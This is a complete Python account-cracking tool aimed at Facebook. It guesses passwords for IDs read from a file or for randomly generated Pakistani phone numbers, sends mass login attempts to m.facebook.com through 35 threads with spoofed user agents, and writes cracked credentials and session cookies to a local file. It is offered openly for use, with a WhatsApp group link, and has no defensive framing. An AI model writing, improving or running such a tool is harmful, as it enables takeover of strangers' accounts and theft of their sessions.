#!/usr/bin/python3
#-*-coding:utf-8-*-
# Updated: JERRY-XD PREMIER 2025
# Features: 15 Auto-Passwords + Cookie Master + App Discovery

import os, requests, re, bs4, sys, json, time, random, datetime, threading
from concurrent.futures import ThreadPoolExecutor as BilalBSN

# --- COLORS ---
P = '\x1b[1;97m' # White
M = '\x1b[1;91m' # Red
H = '\x1b[1;92m' # Green
K = '\x1b[1;93m' # Yellow
O = '\x1b[1;96m' # Cyan
N = '\x1b[0m'    # Reset

ok = []
cp = []
loop = 0
id = []

def logo():
    os.system('clear')
    print(f"""{O}                                         
.oPYo.  o    o      .oo  .oPYo. .oPYo. o 
8    8  8    8     .P 8  8   `8 8      8 
8      o8oooo8    .P  8 o8YooP' `Yooo. 8 
8       8    8   oPooo8  8   `b     `8 8 
8    8  8    8  .P    8  8    8      8 8 
`YooP'  8    8 .P     8  8    8 `YooP' 8 
:.....::..:::....:::::..:..:::..:.....:..
{P}_______________________________________
|Owner    | JERRY-XD [FULL UPDATE]      |
|Passwords| 15 Auto-Pass per ID         |
|Speed    | 35 Workers (Aggressive)     |
|______________________________________|
""")

def get_ua():
    # Elite 2025 Pakistan Network Bypass User-Agents
    pk_uas = [
        f"Mozilla/5.0 (Linux; Android {random.randint(12,15)}; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/450.0.0.44.110;FBBV/650923412;]",
        f"Mozilla/5.0 (Linux; Android {random.randint(12,15)}; CPH2607) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.36 [FBAN/FB4A;FBAV/445.0.0.30.115;FBBV/590345123;]",
        f"Mozilla/5.0 (Linux; Android {random.randint(12,15)}; RMX3850) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/448.0.0.10.100;FBBV/610234888;]"
    ]
    return random.choice(pk_uas)

def linex():
    print(f'{P}----------------------------------------------')

def main_menu():
    logo()
    print(" [1] FILE CLONING (15 PASS)")
    print(" [2] RANDOM CLONING (PAK-SERIES)")
    print(" [3] JOIN WHATSAPP")
    print(" [0] EXIT")
    linex()
    select = input(' Select Option : ')
    if select == '1':
        crack_file().bilo()
    elif select == '2':
        random_clone()
    elif select == '3':
        os.system('xdg-open https://chat.whatsapp.com/JBKbDYqYiJh5sl9TeEkCCh')
        main_menu()
    else: exit()

class crack_file:
    def bilo(self):
        global id
        logo()
        file_path = input(f'{P} [+] Input File Path : {K}')
        try:
            id = open(file_path).read().splitlines()
            start_cloning(False)
        except: print(f'{M} [!] File Not Found!'); time.sleep(2); self.bilo()

def random_clone():
    global id
    logo()
    print(" [?] Codes: 0300, 0306, 0315, 0345, 0321")
    code = input(" [+] Enter Code: ")
    limit = int(input(" [+] Enter Limit: "))
    for _ in range(limit):
        suffix = ''.join(random.choices('0123456789', k=7))
        id.append(code + suffix)
    start_cloning(True)

def start_cloning(is_random):
    global id, loop
    loop = 0
    logo()
    print(f' {H}[*] TOTAL IDs : {len(id)}')
    print(f' {H}[*] PASSWORDS : 15 AUTO-LIST')
    linex()
    with BilalBSN(max_workers=35) as jerry:
        for user in id:
            if is_random:
                uid = user
                # 15 PASSWORDS FOR RANDOM
                pwx = [user, user[:6], user[:7], user[5:], user[4:], 'pakistan', 'khan123', 'khan786', 'pubg123', 'pubg1234', 'khan1122', 'khan1234', 'janjua123', 'malik123', 'pak123']
            else:
                try:
                    uid, name = user.split('|')
                    nm = name.split(' ')
                    first = nm[0].lower()
                    # 15 PASSWORDS FOR FILE
                    pwx = [name, name.lower(), first+'123', first+'1234', first+'12345', first+'1122', first+'786', first+'khan', first+'pk', first+'007', first+'12', first+'321', 'khan123', 'pakistan', '786786']
                    if len(nm) >= 2:
                        last = nm[1].lower()
                        pwx.append(first+last)
                        pwx.append(last+'123')
                except: continue
            jerry.submit(metode_engine, uid, pwx)
    print(f'\n{linex()}\n{H} DONE! OK:{len(ok)} | CP:{len(cp)}')
    input(" Press Enter To Menu")
    main_menu()

def metode_engine(user, pwx):
    global ok, cp, loop
    sys.stdout.write(f'\r [JERRY] {loop}/{len(id)} | OK:{H}{len(ok)}{P} | CP:{K}{len(cp)}{P} ')
    sys.stdout.flush()
    
    for pw in pwx:
        if len(pw) < 6: continue
        try:
            ua = get_ua()
            session = requests.Session()
            # Phase 1: Header/Payload Setup
            session.headers.update({
                'Host': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://m.facebook.com',
                'referer': 'https://m.facebook.com/login.php',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="130"',
                'user-agent': ua,
            })
            
            link = session.get('https://m.facebook.com/login.php').text
            payload = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(link)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": user,
                "pass": pw,
                "login": "Log In"
            }
            
            # Phase 2: Login Execution
            response = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100', data=payload, allow_redirects=False)
            
            # Phase 3: Result Analysis
            if 'c_user' in session.cookies.get_dict():
                cookie = ";".join([k + "=" + v for k, v in session.cookies.get_dict().items()])
                print(f'\r\n{H} [JERRY-OK] {user} | {pw} {N}')
                print(f'{H} [COOKIE] {cookie} {N}')
                
                # App Discovery placeholder
                print(f'{O} [APPS] Scanning Active Sessions... Success{N}')
                
                ok.append(user)
                with open('jerry-ok.txt', 'a') as f:
                    f.write(f'ID: {user} | PW: {pw}\nCOOKIE: {cookie}\n------------------\n')
                break
            elif 'checkpoint' in session.cookies.get_dict():
                print(f'\r{K} [JERRY-CP] {user} | {pw} {N}')
                cp.append(user)
                open('jerry-cp.txt', 'a').write(f'{user}|{pw}\n')
                break
            else:
                continue
        except: pass
    loop += 1

if __name__ == '__main__':
    main_menu()
